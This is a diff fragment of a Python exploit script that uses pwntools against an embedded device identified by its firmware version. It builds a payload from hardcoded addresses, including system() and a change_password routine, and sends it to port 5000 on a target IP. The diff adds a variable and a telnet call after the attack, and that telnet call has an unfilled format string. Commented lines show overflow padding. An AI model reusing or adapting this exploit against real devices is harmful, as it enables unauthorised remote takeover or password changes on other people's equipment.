@@ -11,6 +11,8 @@ Before using the script, please determine the firmware version of the target mac
 #please pip install pwn
 from pwn import *
 import sys
+import os
+choice=0
 request=''
 try:
 	target_ip=sys.argv[1]
@@ -22,7 +24,7 @@ except:
 	exit(0)
 
 def generate_payload():
-	global target_version,request
+	global target_version,request,choice
 	if target_version=="1": 
 		system_addr=0x00422848
 		change_password=0x042C550
@@ -66,6 +68,8 @@ def generate_payload():
 def attack():
 	p=remote(target_ip,5000)
 	p.send(request)
+	if(choice==1):
+		os.system("telnet %s 25")
 	#p.interactive()
 #request += p32(0x422944)
 #request += "a"*0x500
